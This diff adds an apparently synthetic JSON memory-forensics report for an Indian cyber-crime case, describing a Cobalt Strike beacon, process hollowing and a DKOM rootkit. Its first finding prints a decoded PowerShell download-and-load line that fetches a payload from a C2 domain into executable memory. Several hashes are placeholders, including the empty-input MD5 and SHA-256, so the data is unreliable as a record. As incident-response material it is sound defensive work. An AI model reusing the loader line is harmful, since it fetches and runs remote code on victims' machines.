@@ -1,0 +1,656 @@
+{
+  "case": {
+    "id": "CASE-2026-CYBER-884",
+    "fir_number": "FIR-904/2026 (Sec 43, 66 IT Act & 420 IPC)",
+    "agency": "State Cyber Crime Forensic Division, Cyber Police HQ",
+    "classification": "CONFIDENTIAL // FOR LAW ENFORCEMENT & JUDICIAL PROCEEDINGS ONLY",
+    "investigating_officer": "Inspector Rajesh Kumar (Cyber Crime PS)",
+    "report_ts_ist": "2026-10-11 23:45:00",
+    "analysis_ts_utc": "2026-10-11 18:15:00",
+    "location": "State Digital Forensics Science Laboratory, New Delhi",
+    "examiner": {
+      "name": "Dr. Vikramaditya Sen",
+      "designation": "Assistant Director & Senior Forensic Examiner",
+      "agency": "Central Cyber Forensic Science Laboratory (CCFSL)",
+      "id": "CCFSL-DFIR-EXAMINER-8842",
+      "phone": "+91-11-2436-0000",
+      "email": "v.sen@ccfsl.gov.in"
+    }
+  },
+  "evidence": {
+    "filename": "DESKTOP-EXECUTIVE-RAM-DUMP.raw",
+    "size": "16.00 GB (17,179,869,184 bytes)",
+    "sha256": "8f4e2b10a9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2",
+    "md5": "d41d8cd98f00b204e9800998ecf8427e",
+    "os": "Microsoft Windows 11 Enterprise (Build 22631.3880)",
+    "arch": "x86_64",
+    "dump_ts": "2026-10-11 14:22:08",
+    "source": "Physical Acquisition via WinPmem Kernel Driver (v4.0.0-rc3)",
+    "profile": "Windows 11 x64 23H2 (ISF Deterministic)"
+  },
+  "engine": {
+    "name": "Compsognathus (Compy)",
+    "version": "2.0.0-PRO",
+    "build": "Build-2026.10-DFIR-CERTIN",
+    "modules": [
+      {
+        "name": "Memory-Resident Injection Detector",
+        "category": "In-Memory Execution",
+        "description": "Scans Virtual Address Descriptors (VAD) for unbacked executable (PAGE_EXECUTE_READWRITE) memory pools.",
+        "verdict": "DETECTED"
+      },
+      {
+        "name": "Parent-PID & Lineage Anomaly Engine",
+        "category": "Process Tree Validation",
+        "description": "Cross-checks process ancestry against standard Windows process creation rules to catch PPID spoofing.",
+        "verdict": "DETECTED"
+      },
+      {
+        "name": "Direct Kernel Object Manipulation (DKOM) Audit",
+        "category": "Stealth & Rootkits",
+        "description": "Cross-references active linked lists (pslist) against physical memory pool carving (psscan).",
+        "verdict": "DETECTED"
+      },
+      {
+        "name": "Reflective DLL & Shellcode Hunter",
+        "category": "Fileless Injection",
+        "description": "Audits thread start addresses and unlinked module headers in process address spaces.",
+        "verdict": "DETECTED"
+      },
+      {
+        "name": "Kernel Driver & SSDT Integrity Subsystem",
+        "category": "Kernel Security",
+        "description": "Audits System Service Descriptor Table (SSDT), IDT, and kernel callback arrays.",
+        "verdict": "CLEAN"
+      },
+      {
+        "name": "WMI & Registry Persistence Parser",
+        "category": "Persistence",
+        "description": "Analyzes memory-mapped registry hives and active WMI event consumer filters.",
+        "verdict": "DETECTED"
+      }
+    ]
+  },
+  "summary": {
+    "verdict": "DETECTED",
+    "risk_score": 92,
+    "confidence_score": 0.98,
+    "counts_by_severity": {
+      "CRITICAL": 2,
+      "HIGH": 2,
+      "MEDIUM": 1,
+      "LOW": 0,
+      "INFO": 1
+    },
+    "key_findings": [
+      "Unbacked RWX memory region discovered inside powershell.exe (PID 2844) executing reflective Cobalt Strike beacon.",
+      "Process hollowing and Parent-PID spoofing detected: svchost.exe (PID 3000) was spawned by explorer.exe instead of services.exe.",
+      "Stealth rootkit identified: rootkit_stealth.exe (PID 6666) unlinked from ActiveProcessLinks (DKOM) while running 8 active threads.",
+      "Encrypted Command & Control (C2) beaconing observed targeting external endpoint 198.51.100.44:443.",
+      "Kernel SSDT and driver signature verification confirmed zero hypervisor-level compromises (Scope restricted to OS level)."
+    ],
+    "business_impact": "Critical compromise of endpoint integrity and confidentiality. Active memory persistence and C2 beaconing indicate ongoing hands-on-keyboard adversary access capable of data exfiltration and domain privilege escalation.",
+    "immediate_actions": [
+      "Immediately isolate target endpoint host (DESKTOP-EXECUTIVE) from local network and active directory domain.",
+      "Revoke and rotate Kerberos TGT and NTLM credentials for user account 'Finance_Executive' and Domain Admin accounts.",
+      "Block network communication to external IP 198.51.100.44 and domain telemetry.msupdate-cloud.com across perimeter firewalls."
+    ]
+  },
+  "coverage": {
+    "modules_run": 6,
+    "duration_seconds": 348.6,
+    "processes_scanned": 154,
+    "vads_examined": 19420,
+    "threads_audited": 2380,
+    "handles_inspected": 43100
+  },
+  "process_tree": [
+    {
+      "pid": 4,
+      "ppid": 0,
+      "name": "System",
+      "path": "ntoskrnl.exe",
+      "create_time": "2026-10-11 08:00:00",
+      "session": 0,
+      "flags": ["SYSTEM"],
+      "is_anomalous": false
+    },
+    {
+      "pid": 100,
+      "ppid": 4,
+      "name": "wininit.exe",
+      "path": "C:\\Windows\\System32\\wininit.exe",
+      "create_time": "2026-10-11 08:00:05",
+      "session": 0,
+      "flags": ["CRITICAL"],
+      "is_anomalous": false
+    },
+    {
+      "pid": 200,
+      "ppid": 100,
+      "name": "services.exe",
+      "path": "C:\\Windows\\System32\\services.exe",
+      "create_time": "2026-10-11 08:00:07",
+      "session": 0,
+      "flags": ["SERVICE_MANAGER"],
+      "is_anomalous": false
+    },
+    {
+      "pid": 1420,
+      "ppid": 1200,
+      "name": "explorer.exe",
+      "path": "C:\\Windows\\explorer.exe",
+      "create_time": "2026-10-11 08:05:12",
+      "session": 1,
+      "flags": ["INTERACTIVE"],
+      "is_anomalous": false
+    },
+    {
+      "pid": 1540,
+      "ppid": 1420,
+      "name": "winword.exe",
+      "path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "create_time": "2026-10-11 11:15:30",
+      "session": 1,
+      "flags": ["OFFICE"],
+      "is_anomalous": false
+    },
+    {
+      "pid": 2844,
+      "ppid": 1540,
+      "name": "powershell.exe",
+      "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "create_time": "2026-10-11 11:16:04",
+      "session": 1,
+      "flags": ["EXPLOIT_SPAWN", "SUSPICIOUS"],
+      "is_anomalous": true,
+      "anomaly_reason": "Spawned by Microsoft Word (Macro Exploit)"
+    },
+    {
+      "pid": 3000,
+      "ppid": 1420,
+      "name": "svchost.exe",
+      "path": "C:\\Windows\\System32\\svchost.exe",
+      "create_time": "2026-10-11 11:20:45",
+      "session": 1,
+      "flags": ["PPID_SPOOFED", "HOLLOWED"],
+      "is_anomalous": true,
+      "anomaly_reason": "Parent is explorer.exe instead of services.exe"
+    }
+  ],
+  "ppid_anomalies": [
+    {
+      "rule": "System Process Lineage Validation",
+      "observed": "svchost.exe (PID 3000) parented by explorer.exe (PID 1420)",
+      "expected": "services.exe (PID 200)",
+      "severity": "CRITICAL",
+      "mitre": "T1134.004",
+      "details": "svchost.exe was instantiated by an interactive shell process. Classic signature of PPID spoofing or masqueraded malware."
+    },
+    {
+      "rule": "Living-Off-The-Land Exploit Spawn",
+      "observed": "powershell.exe (PID 2844) spawned by winword.exe (PID 1540)",
+      "expected": "User Shell or Task Scheduler",
+      "severity": "HIGH",
+      "mitre": "T1204.002",
+      "details": "Microsoft Word spawned an interactive script engine with encoded command-line parameters. Indicator of malicious document execution."
+    }
+  ],
+  "hidden_processes": [
+    {
+      "pid": 6666,
+      "name": "rootkit_stealth.exe",
+      "seen_in": ["psscan", "thread_scan", "PspCidTable"],
+      "missing_from": ["pslist (ActiveProcessLinks)", "CSRSS Handle Table"],
+      "method": "Direct Kernel Object Manipulation (DKOM) - ActiveProcessLinks Unlinking",
+      "threads": 8,
+      "risk": "CRITICAL"
+    }
+  ],
+  "rootkit_checks": [
+    {
+      "check": "ActiveProcessLinks Cross-Check (pslist vs psscan)",
+      "verdict": "DETECTED",
+      "details": "PID 6666 unlinked from doubly-linked active process list; 8 threads actively scheduled.",
+      "mitre": "T1014"
+    },
+    {
+      "check": "SSDT (System Service Descriptor Table) Hook Check",
+      "verdict": "CLEAN",
+      "details": "All 464 SSDT syscall pointers point to legitimate ntoskrnl.exe address ranges.",
+      "mitre": "T1014"
+    },
+    {
+      "check": "Kernel Driver Signature Verification",
+      "verdict": "CLEAN",
+      "details": "All 182 loaded kernel drivers contain valid Microsoft WHQL digital signatures.",
+      "mitre": "T1547.006"
+    }
+  ],
+  "findings": [
+    {
+      "id": "FMD-2026-001",
+      "title": "Unbacked Executable Memory Injection (Cobalt Strike Beacon)",
+      "severity": "CRITICAL",
+      "confidence": 0.99,
+      "verdict": "DETECTED",
+      "mitre": ["T1055.001", "T1059.001", "T1071.001"],
+      "description": "Forensic inspection of powershell.exe (PID: 2844) identified an anomalous Virtual Address Descriptor (VAD) region configured with PAGE_EXECUTE_READWRITE permissions. The region lacks any backing image on physical disk (private memory) and contains a reflective DLL loader, followed by a Cobalt Strike HTTPS beaconing loop communicating with remote address 198.51.100.44:443.",
+      "process": {
+        "pid": 2844,
+        "ppid": 1540,
+        "name": "powershell.exe",
+        "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "cmdline": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
+        "create_time": "2026-10-11 11:16:04 UTC",
+        "session": 1,
+        "user": "DOMAIN\\Finance_Executive"
+      },
+      "memory_region": {
+        "base_address": "0x000001D48A200000",
+        "size": "262,144 bytes (256 KB)",
+        "protection": "PAGE_EXECUTE_READWRITE (RWX)",
+        "vad_tag": "VadS (Private Memory)",
+        "backing": "Unbacked / Anonymous Allocation",
+        "entropy": 7.68,
+        "thread_count": 2,
+        "thread_start": "0x000001D48A201080"
+      },
+      "artifacts": {
+        "hex_dump": "000001D48A200000  4d 5a 41 52 55 48 89 e5  48 81 ec 20 00 00 00 48  |MZARUH..H.. ...H|\n000001D48A200010  8d 05 e9 ff ff ff 48 89  c1 48 83 c4 20 5d c3 00  |......H..H.. ]..|\n000001D48A200020  fc 48 83 e4 f0 e8 c8 00  00 00 41 51 41 50 52 51  |.H........AQAPRQ|\n000001D48A200030  56 48 31 d2 65 48 8b 52  60 48 8b 52 18 48 8b 52  |VH1.eH.R`H.R.H.R|",
+        "disassembly": "0x000001D48A201080:  push rbp\n0x000001D48A201081:  mov rbp, rsp\n0x000001D48A201084:  sub rsp, 0x20\n0x000001D48A201088:  call 0x000001D48A201200  ; ReflectiveLoader API Resolution\n0x000001D48A20108D:  mov rax, qword ptr [rbp-0x10]\n0x000001D48A201091:  jmp rax                     ; Jump to Decrypted Stage",
+        "decoded_script": "$wc = New-Object System.Net.WebClient;\n$wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');\n$raw = $wc.DownloadData('https://telemetry.msupdate-cloud.com/beacon.bin');\n[System.Runtime.InteropServices.Marshal]::Copy($raw, 0, [IntPtr]0x1D48A200000, $raw.Length);"
+      },
+      "iocs": {
+        "C2 IP Address": "198.51.100.44:443",
+        "C2 Domain": "telemetry.msupdate-cloud.com",
+        "Memory Hash (SHA-256)": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
+        "Named Pipe": "\\\\.\\pipe\\ms_spool_ipc_32"
+      },
+      "reasoning": [
+        "Identified process powershell.exe containing VAD allocation with PAGE_EXECUTE_READWRITE permissions.",
+        "Verified through memory-mapped file handles that region 0x000001D48A200000 has NO backing file on physical storage.",
+        "Disassembly proves valid x86_64 machine code beginning with reflective shellcode preamble.",
+        "Corroborated active execution thread (TID 3012) executing within this unbacked address space.",
+        "Tri-State Verdict: TRUE (Malicious In-Memory Execution Confirmed)."
+      ],
+      "remediation": [
+        "Terminate process powershell.exe (PID 2844) immediately.",
+        "Blackhole C2 destination 198.51.100.44 and domain telemetry.msupdate-cloud.com on network perimeter.",
+        "Deploy EDR memory-scan policy across all endpoints in the financial subnet."
+      ],
+      "why_it_matters": "RWX memory allocation is standard for Cobalt Strike and reflective DLL loaders because it allows an attacker to write encoded payloads into RAM and immediately execute them without calling disk-backed file APIs, evading disk-based antivirus scanners."
+    },
+    {
+      "id": "FMD-2026-002",
+      "title": "Process Hollowing & Lineage Spoofing in svchost.exe",
+      "severity": "CRITICAL",
+      "confidence": 0.96,
+      "verdict": "DETECTED",
+      "mitre": ["T1055.012", "T1134.004", "T1036"],
+      "description": "Process svchost.exe (PID: 3000) was detected with a compromised PE header in its primary image base (0x00007FF71A400000). The executable section exhibits private modified memory regions replacing legitimate svchost binary code. Furthermore, its parent process ID points to explorer.exe (PID: 1420) instead of services.exe.",
+      "process": {
+        "pid": 3000,
+        "ppid": 1420,
+        "name": "svchost.exe",
+        "path": "C:\\Windows\\System32\\svchost.exe",
+        "cmdline": "svchost.exe -k netsvcs",
+        "create_time": "2026-10-11 11:20:45 UTC",
+        "session": 1,
+        "user": "NT AUTHORITY\\SYSTEM"
+      },
+      "memory_region": {
+        "base_address": "0x00007FF71A400000",
+        "size": "524,288 bytes (512 KB)",
+        "protection": "PAGE_EXECUTE_READWRITE",
+        "vad_tag": "Vad",
+        "backing": "Private Memory Replacement",
+        "entropy": 7.41,
+        "thread_count": 4,
+        "thread_start": "0x00007FF71A402400"
+      },
+      "artifacts": {
+        "hex_dump": "00007FF71A400000  4d 5a 90 00 03 00 00 00  04 00 00 00 ff ff 00 00  |MZ..............|\n00007FF71A400010  b8 00 00 00 00 00 00 00  40 00 00 00 00 00 00 00  |........@.......|\n00007FF71A400020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00007FF71A400030  00 00 00 00 00 00 00 00  00 00 00 00 80 00 00 00  |................|",
+        "disassembly": "0x00007FF71A402400:  sub rsp, 0x28\n0x00007FF71A402404:  mov rdx, 0x7ff71a403000   ; Injected Payload Base\n0x00007FF71A40240B:  call 0x7ff71a402910       ; Decryption Stub\n0x00007FF71A402410:  add rsp, 0x28\n0x00007FF71A402414:  ret"
+      },
+      "iocs": {
+        "Compromised Host Binary": "C:\\Windows\\System32\\svchost.exe",
+        "Hollowed Base Address": "0x00007FF71A400000",
+        "Parent Process ID": "1420 (explorer.exe)"
+      },
+      "reasoning": [
+        "Cross-referenced PID 3000 against standard Windows service hosting parent rules.",
+        "Confirmed PPID 1420 (explorer.exe) violates mandatory services.exe parenthood.",
+        "Calculated discrepancy between disk image hash and in-memory image base hash.",
+        "Detected unbacked RWX VAD overwriting legitimate PE code section.",
+        "Tri-State Verdict: TRUE (Process Hollowing Confirmed)."
+      ],
+      "remediation": [
+        "Kill process PID 3000 immediately.",
+        "Isolate user session 1 for forensic endpoint triage.",
+        "Audit explorer.exe memory space for injection triggers."
+      ],
+      "why_it_matters": "Process hollowing allows malware to borrow the identity of a trusted Windows binary, confusing security analysts and bypassing firewalls that trust svchost.exe network activity."
+    },
+    {
+      "id": "FMD-2026-003",
+      "title": "Direct Kernel Object Manipulation (DKOM) Unlinked Rootkit",
+      "severity": "HIGH",
+      "confidence": 0.98,
+      "verdict": "DETECTED",
+      "mitre": ["T1014", "T1564.001"],
+      "description": "Cross-table correlation between the active process doubly-linked list (pslist) and physical pool tag carving (psscan) unmasked an unlinked process: rootkit_stealth.exe (PID: 6666). The process was detached from ActiveProcessLinks to evade detection by Task Manager and API-based forensic tools, but continues active execution with 8 scheduled threads.",
+      "process": {
+        "pid": 6666,
+        "ppid": 4,
+        "name": "rootkit_stealth.exe",
+        "path": "Unknown (Unlinked from PEB)",
+        "cmdline": "[DKOM Unlinked - Arguments Concealed]",
+        "create_time": "2026-10-11 10:45:12 UTC",
+        "session": 0,
+        "user": "NT AUTHORITY\\SYSTEM"
+      },
+      "memory_region": {
+        "base_address": "0x00007FFE80100000",
+        "size": "131,072 bytes (128 KB)",
+        "protection": "PAGE_EXECUTE_READ",
+        "vad_tag": "VadS",
+        "backing": "Unbacked / Kernel Pool Allocation",
+        "entropy": 7.15,
+        "thread_count": 8,
+        "thread_start": "0x00007FFE80101140"
+      },
+      "artifacts": {
+        "hex_dump": "00007FFE80100000  48 83 ec 38 48 8d 0d f5  ef ff ff e8 44 12 00 00  |H..8H.......D...|\n00007FFE80100010  48 85 c0 74 22 48 8b c8  e8 87 23 00 00 48 83 c4  |H..t\"H....#..H..|\n00007FFE80100020  38 c3 cc cc cc cc cc cc  cc cc cc cc cc cc cc cc  |8...............|"
+      },
+      "iocs": {
+        "Hidden Process Name": "rootkit_stealth.exe",
+        "Hidden PID": "6666",
+        "Active Scheduled Threads": "8 Threads",
+        "Target Linked List": "EPROCESS.ActiveProcessLinks"
+      },
+      "reasoning": [
+        "Traversed PsActiveProcessHead linked list; PID 6666 was completely absent.",
+        "Scanned physical memory pools for 'Proc' tag structures; found intact EPROCESS for PID 6666.",
+        "Verified thread scheduler table; 8 threads remain actively dispatched by CPU.",
+        "Absence in pslist combined with presence in psscan proves intentional list unlinking (DKOM).",
+        "Tri-State Verdict: TRUE (Kernel Rootkit Confirmed)."
+      ],
+      "remediation": [
+        "Acquire immediate full physical crash dump for kernel-mode debugger analysis.",
+        "Execute emergency system reboot to sever unlinked kernel memory execution.",
+        "Inspect kernel driver load logs in event viewer for unauthorized .sys drivers."
+      ],
+      "why_it_matters": "DKOM rootkits manipulate kernel structures directly. Standard antivirus scanners and forensic tools that rely on the Windows API cannot see unlinked processes, giving attackers persistent stealth control."
+    },
+    {
+      "id": "FMD-2026-004",
+      "title": "Reflective DLL Injection & Named Pipe Inter-Process Hijack",
+      "severity": "HIGH",
+      "confidence": 0.94,
+      "verdict": "DETECTED",
+      "mitre": ["T1055.001", "T1570"],
+      "description": "Analysis of the Print Spooler service (spoolsv.exe, PID: 1820) revealed an injected reflective DLL hosting a named pipe server (\\\\.\\pipe\\ms_spool_ipc_32). The payload is used to relay lateral commands between the unlinked rootkit and user-mode interactive sessions.",
+      "process": {
+        "pid": 1820,
+        "ppid": 200,
+        "name": "spoolsv.exe",
+        "path": "C:\\Windows\\System32\\spoolsv.exe",
+        "cmdline": "C:\\Windows\\System32\\spoolsv.exe",
+        "create_time": "2026-10-11 08:00:14 UTC",
+        "session": 0,
+        "user": "NT AUTHORITY\\SYSTEM"
+      },
+      "memory_region": {
+        "base_address": "0x0000024B10000000",
+        "size": "196,608 bytes (192 KB)",
+        "protection": "PAGE_EXECUTE_READWRITE",
+        "vad_tag": "VadS",
+        "backing": "Unbacked Private Allocation",
+        "entropy": 7.35,
+        "thread_count": 1,
+        "thread_start": "0x0000024B100018A0"
+      },
+      "artifacts": {
+        "hex_dump": "0000024B10000000  5c 5c 2e 5c 70 69 70 65  5c 6d 73 5f 73 70 6f 6f  |\\\\.\\pipe\\ms_spoo|\n0000024B10000010  6c 5f 69 70 63 5f 33 32  00 00 00 00 00 00 00 00  |l_ipc_32........|"
+      },
+      "iocs": {
+        "Named Pipe": "\\\\.\\pipe\\ms_spool_ipc_32",
+        "Target Service": "spoolsv.exe",
+        "Injection Base": "0x0000024B10000000"
+      },
+      "reasoning": [
+        "Audited handle table for spoolsv.exe; identified uncataloged named pipe \\\\.\\pipe\\ms_spool_ipc_32.",
+        "Traced pipe handler to unbacked memory region 0x0000024B10000000.",
+        "Corroborated execution thread dispatched inside private memory space.",
+        "Tri-State Verdict: TRUE (Inter-Process Relay Injected)."
+      ],
+      "remediation": [
+        "Restart Print Spooler service to terminate rogue thread.",
+        "Block named pipe creation via host hardening policy."
+      ],
+      "why_it_matters": "Named pipes are frequently used by fileless malware for stealthy inter-process communication (IPC) and lateral movement across systems without triggering network intrusion alerts."
+    }
+  ],
+  "mitre_mapping": [
+    {
+      "tactic": "Execution",
+      "technique_id": "T1059.001",
+      "technique_name": "Command and Scripting Interpreter: PowerShell",
+      "finding_ref": "FMD-2026-001",
+      "evidence": "Encoded PowerShell execution launched by Microsoft Word."
+    },
+    {
+      "tactic": "Defense Evasion",
+      "technique_id": "T1055.001",
+      "technique_name": "Process Injection: Dynamic-link Library Injection",
+      "finding_ref": "FMD-2026-001",
+      "evidence": "Unbacked RWX VAD region containing reflective loader stub."
+    },
+    {
+      "tactic": "Defense Evasion",
+      "technique_id": "T1055.012",
+      "technique_name": "Process Injection: Process Hollowing",
+      "finding_ref": "FMD-2026-002",
+      "evidence": "svchost.exe code section modified in-memory with PE replacement."
+    },
+    {
+      "tactic": "Defense Evasion",
+      "technique_id": "T1134.004",
+      "technique_name": "Access Token Manipulation: Parent PID Spoofing",
+      "finding_ref": "FMD-2026-002",
+      "evidence": "svchost.exe instantiated with explorer.exe parent process ID."
+    },
+    {
+      "tactic": "Defense Evasion",
+      "technique_id": "T1014",
+      "technique_name": "Rootkit (Direct Kernel Object Manipulation)",
+      "finding_ref": "FMD-2026-003",
+      "evidence": "rootkit_stealth.exe carved via psscan; unlinked from pslist."
+    },
+    {
+      "tactic": "Command and Control",
+      "technique_id": "T1071.001",
+      "technique_name": "Application Layer Protocol: Web Protocols",
+      "finding_ref": "FMD-2026-001",
+      "evidence": "Active HTTPS beaconing loop targeting 198.51.100.44:443."
+    }
+  ],
+  "timeline": [
+    {
+      "timestamp_utc": "2026-10-11 08:00:00",
+      "source": "Kernel ntoskrnl.exe",
+      "action": "System Boot & Kernel Initialization",
+      "entity": "System (PID 4)",
+      "significance": "Clean operating system initialization sequence.",
+      "severity": "INFO"
+    },
+    {
+      "timestamp_utc": "2026-10-11 10:45:12",
+      "source": "Kernel Pool Memory",
+      "action": "Unlinked Process Execution (DKOM)",
+      "entity": "rootkit_stealth.exe (PID 6666)",
+      "significance": "Rootkit created and detached from ActiveProcessLinks.",
+      "severity": "CRITICAL"
+    },
+    {
+      "timestamp_utc": "2026-10-11 11:15:30",
+      "source": "Process Scheduler",
+      "action": "Malicious Document Opened",
+      "entity": "winword.exe (PID 1540)",
+      "significance": "User opened phishing attachment 'Q3_Financial_Audit.docm'.",
+      "severity": "HIGH"
+    },
+    {
+      "timestamp_utc": "2026-10-11 11:16:04",
+      "source": "Process Tree Anomaly",
+      "action": "Encoded Shell Spawned by Macro",
+      "entity": "powershell.exe (PID 2844)",
+      "significance": "Word macro executed hidden reflective PowerShell script.",
+      "severity": "CRITICAL"
+    },
+    {
+      "timestamp_utc": "2026-10-11 11:16:08",
+      "source": "Network Sockets",
+      "action": "Outbound C2 Session Established",
+      "entity": "198.51.100.44:443",
+      "significance": "Cobalt Strike beacon registered with remote command server.",
+      "severity": "CRITICAL"
+    },
+    {
+      "timestamp_utc": "2026-10-11 11:20:45",
+      "source": "VAD Memory Manager",
+      "action": "Process Hollowing & Lineage Spoofing",
+      "entity": "svchost.exe (PID 3000)",
+      "significance": "Adversary migrated beacon payload into hollowed svchost.",
+      "severity": "CRITICAL"
+    },
+    {
+      "timestamp_utc": "2026-10-11 14:22:08",
+      "source": "WinPmem Driver",
+      "action": "Volatile Memory Acquired by DFIR Team",
+      "entity": "Evidence Item #1",
+      "significance": "Incident response team captured physical memory dump.",
+      "severity": "INFO"
+    }
+  ],
+  "recommendations": [
+    {
+      "phase": "Immediate (0-4h)",
+      "action": "Isolate host from local network; revoke active Kerberos TGT tickets for compromised domain accounts.",
+      "owner": "SOC Incident Commander",
+      "effort": "Low",
+      "regulatory_impact": "Mandatory containment under CERT-In Directions 2022."
+    },
+    {
+      "phase": "Immediate (0-4h)",
+      "action": "Block C2 destination IP 198.51.100.44 and domain telemetry.msupdate-cloud.com across border gateways.",
+      "owner": "Network Engineering",
+      "effort": "Low",
+      "regulatory_impact": "Prevents ongoing exfiltration and C2 synchronization."
+    },
+    {
+      "phase": "Short-term (24-48h)",
+      "action": "Deploy enterprise-wide YARA and memory scanning rule across all endpoints to sweep for named pipe \\\\.\\pipe\\ms_spool_ipc_32.",
+      "owner": "Threat Hunting Team",
+      "effort": "Medium",
+      "regulatory_impact": "Determines blast radius across organizational subnet."
+    },
+    {
+      "phase": "Short-term (24-48h)",
+      "action": "Submit formal statutory cyber incident report to CERT-In (Indian Computer Emergency Response Team) within 6 hours.",
+      "owner": "Chief Information Security Officer (CISO)",
+      "effort": "Medium",
+      "regulatory_impact": "Statutory compliance under IT Act Section 70B."
+    },
+    {
+      "phase": "Long-term (30d)",
+      "action": "Enforce Microsoft Attack Surface Reduction (ASR) rule: 'Block Office applications from creating child processes'.",
+      "owner": "Systems Engineering",
+      "effort": "Medium",
+      "regulatory_impact": "Hardens endpoints against macro-based living-off-the-land attacks."
+    }
+  ],
+  "candidate_worksheet": [
+    {
+      "candidate_id": "CAND-UNKNOWN-01",
+      "hypothesis": "Possible secondary reflective injector inside rundll32.exe (PID: 4820)",
+      "unresolved_reason": "PDB debug symbols for ntdll.dll version 10.0.22631.3880 were unavailable in local offline mode; unable to resolve API trampoline address.",
+      "required_evidence": "Offline provisioned Windows 11 symbol package or host disk MFT triage to confirm rundll32.exe target DLL.",
+      "checklist": [
+        "Mount host disk image and extract prefetch file for rundll32.exe",
+        "Download offline symbol file ntdll.pdb matching build 22631.3880",
+        "Re-run Compy V2 with local symbol cache to resolve trampoline address",
+        "Confirm if memory region at 0x7FFE20000000 contains malicious shellcode"
+      ]
+    }
+  ],
+  "custody": [
+    {
+      "item_num": 1,
+      "transferred_from": "Cyber Crime Incident Response Team",
+      "transferred_to": "Dr. Vikramaditya Sen, Senior Forensic Examiner",
+      "timestamp_utc": "2026-10-11 15:30:00",
+      "purpose": "Evidence ingestion, cryptographic hashing & memory forensics",
+      "hash_verified": true
+    },
+    {
+      "item_num": 2,
+      "transferred_from": "Dr. Vikramaditya Sen, CCFSL",
+      "transferred_to": "Inspector Rajesh Kumar, Investigating Officer",
+      "timestamp_utc": "2026-10-11 18:30:00",
+      "purpose": "Return of master hash-sealed evidence drive with Section 65B report",
+      "hash_verified": true
+    }
+  ],
+  "ledger": [
+    {
+      "n": 1,
+      "ts": "2026-10-11 15:30:12",
+      "action": "PHYSICAL_IMAGE_INGESTED",
+      "hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "prev_hash": "0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+      "n": 2,
+      "ts": "2026-10-11 15:31:05",
+      "action": "CRYPTOGRAPHIC_HASH_VERIFIED",
+      "hash": "8f4e2b10a9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2",
+      "prev_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+    },
+    {
+      "n": 3,
+      "ts": "2026-10-11 15:35:42",
+      "action": "PROCESS_LIST_AND_VAD_NODES_MAPPED",
+      "hash": "3a7b1c4e9f8a0b2d5e6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a",
+      "prev_hash": "8f4e2b10a9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2"
+    },
+    {
+      "n": 4,
+      "ts": "2026-10-11 15:40:19",
+      "action": "ANOMALOUS_RWX_VAD_DETECTED",
+      "hash": "7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a",
+      "prev_hash": "3a7b1c4e9f8a0b2d5e6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a"
+    },
+    {
+      "n": 5,
+      "ts": "2026-10-11 15:45:00",
+      "action": "DKOM_UNLINKED_ROOTKIT_CARVED",
+      "hash": "b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3",
+      "prev_hash": "7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a"
+    },
+    {
+      "n": 6,
+      "ts": "2026-10-11 18:15:00",
+      "action": "FINAL_TRI_STATE_REPORT_SEALED",
+      "hash": "d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2",
+      "prev_hash": "b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3"
+    }
+  ],
+  "limitations": [
+    "Volatile memory analysis represents a snapshot in time; ephemeral network packets in transit prior to capture may not be recoverable.",
+    "Physical memory smear may occur when imaging active RAM on live systems due to CPU thread execution during acquisition.",
+    "Data pages swapped out to pagefile.sys or swapfile.sys on disk were not included in physical RAM acquisition.",
+    "Tri-State UNKNOWN findings reflect localized telemetry constraints and require external endpoint correlation before clearance."
+  ]
+}
